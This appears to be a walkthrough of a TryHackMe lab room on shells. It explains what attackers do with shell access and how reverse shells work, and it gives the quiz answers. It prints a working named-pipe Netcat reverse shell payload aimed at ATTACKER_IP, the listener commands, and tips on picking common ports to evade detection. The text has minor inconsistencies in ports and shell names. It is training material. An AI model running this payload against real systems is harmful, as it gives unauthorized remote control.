Link: https://tryhackme.com/room/shellsoverview (Premium Room)

**Module 1: Room Introduction**

**Introduction**

Shells in cyber security are widely used by attackers to remotely control systems, making them an important part of the attack chain. In this room, we'll explore different shells used in offensive security, the differences between them, and their use cases. This knowledge can help enhance penetration testing and exploitation skills and also help us understand how to detect when a remote shell is being used by an attacker within an organization.
Learning Objectives

In this room, we'll cover the following learning objectives:

- Understand Shells in Offensive Security 

- Set Up and Use Reverse and Bind Shells

- Deploy Web Shells 

**Room Prerequisites**

An understanding of the following topics is recommended before starting the room:

- Basic Understanding of [Networking](https://tryhackme.com/module/networking)

- Fundamental Knowledge of [Web Application Security](https://tryhackme.com/module/web-hacking)

- Basic [Command Line](https://tryhackme.com/module/command-line) Proficiency

- Familiarity with scripting languages like [Bash](https://tryhackme.com/r/room/linuxshells), [Python](https://tryhackme.com/r/room/pythonbasics), or PHP

**Caveats**

The use of Metasploit or other Frameworks that generate or interact with shells has been intentionally left behind from this room. This is to focus on understanding how shells work without the use or assistance of a tool to either set up or generate a shell. Also, for this room, we'll use Linux OS for all the examples.

**Answer the questions below**

1. _Click to complete the task._

Answer: No answer needed

-----------------------------------------------------------------------------------------------------------------------------------------------

**Module 2: Shell Overview**

<img width="800" height="800" alt="image" src="https://github.com/user-attachments/assets/da05815a-26c3-44c4-b4b1-f7c92590f4f4" />

What is a Shell?

A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.

In cyber security, it commonly refers to a specific shell session an attacker uses when accessing a compromised system, allowing them to run commands and execute software. This will allow attackers to execute several activities, some of which are described below.

- **_Remote System Control_**: allows the attacker to execute commands or software remotely in the target system.

- **_Privilege Escalation_**: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.

- **_Data Exfiltration_**: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.

- **_Persistence and Maintenance Access_**: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.

- **_Post-Exploitation Activities_**: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.

- **_Access Other Systems on the Network_**: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting.

All of the shells we will describe in the next tasks can help to achieve different limitations of the attacks described above.

**Answer the questions below**

1. _What is the command-line interface that allows users to interact with an operating system?_

Answer: `Shell`

2. _What process involves using a compromised system as a launching pad to attack other machines in the network?_

Answer: `Pivoting`

3. _What is a common activity attackers perform after obtaining shell access to escalate their privileges?_

Answer: `privilege escalation`

-----------------------------------------------------------------------------------------------------------------------------------------------

**Module 3: Reverse Shell**

**Reverse Shell**

A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

**How Reverse Shells Work**

Set up a Netcat (nc) Listener

Let's now understand how a reverse shell works in a practical scenario using the tool Netcat. This utility supports multiple OSs and allows reading and writing through a network.

As mentioned above, a reverse shell will connect back to the attacker's machine. This machine will be waiting for a connection, so let's use Netcat to listen to a connection using the following command nc -lvnp 443.

```
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...
```

The command above uses the -l option to indicate Netcat to listen or wait for a connection. The -v option enables verbose mode. The -n option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address. Finally, the -p flag indicates the port that will be used to wait for the connection, in the case above, port 443.

Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like 53, 80, 8080, 443, 139, or 445. This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.

Gaining Reverse Shell Access

Once we have our listener set, the attacker should execute what is known as a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network. There's a variety of payloads that will depend on the tools and OS of the compromised system. We can explore some of them [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

As an example, let's analyze an example payload named a pipe reverse shell, as shown below.

` rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`

**Explanation of the Payload**

- `rm -f /tmp/f` - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.

- `mkfifo /tmp/f` - This command creates a named pipe, or FIFO (first-in, first-out), at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.

- `cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.

- `| bash -i 2>&1` - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker.

- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` - This part pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT).

- `>/tmp/f` -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

The payload above can expose the shell bash through the network to the desired listener.

**Attacker Receives the Shell**

Once the above payload is executed, the attacker will receive a reverse shell, as shown below, allowing them to execute commands as if they were logging into a regular terminal in the OS.

```
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```

The output above shows the connection coming from the MACINE_IP , which is the IP address of the compromised target.

**Answer the questions below**

1. _What type of shell allows an attacker to execute commands remotely after the target connects back?_

Answer: `Reverse Shell`

2. _What tool is commonly used to set up a listener for a reverse shell?_

Answer: `Netcat`

-----------------------------------------------------------------------------------------------------------------------------------------------

**Module 4: Bind Shell**

**Bind Shell**

